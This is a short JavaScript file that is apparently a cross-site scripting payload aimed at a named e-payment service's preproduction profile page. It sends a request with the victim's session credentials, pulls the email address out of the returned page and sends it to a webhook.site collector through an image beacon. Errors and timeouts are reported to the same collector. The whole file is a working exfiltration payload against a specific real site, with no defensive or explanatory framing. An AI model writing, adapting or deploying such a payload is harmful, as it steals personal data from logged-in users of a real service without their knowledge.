(function(){
  try {
    var TARGET = "https://epay2-preprod.efinance.com.eg/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0";
    var WEBHOOK = "https://webhook.site/fd927130-bc42-4bf4-81a8-e4b93d169ac2";
    var xhr = new XMLHttpRequest();
    xhr.open("GET", TARGET, true);
    xhr.withCredentials = true;
    xhr.timeout = 10000;

    xhr.onreadystatechange = function() {
      if (xhr.readyState !== 4) return;

      var email = "";
      try {
        var doc = new DOMParser().parseFromString(xhr.responseText || "", "text/html");
        var inp = doc.querySelector('input[name="email"], input[name=email]');
        email = inp ? (inp.value || inp.getAttribute("value") || "") : "";
      } catch (e) {
        email = "";
      }

      // Send email as GET param using image beacon (simple, CORS-agnostic)
      var img = new window.Image();
      img.src = WEBHOOK + "?email=" + encodeURIComponent(email);
    };

    xhr.ontimeout = function(){
      var img = new window.Image();
      img.src = WEBHOOK + "?status=timeout";
    };

    xhr.onerror = function(e){
      var img = new window.Image();
      img.src = WEBHOOK + "?status=xhrerror";
    };

    xhr.send();
  } catch (err) {
    var img = new window.Image();
    img.src = WEBHOOK + "?status=exception";
  }
})();
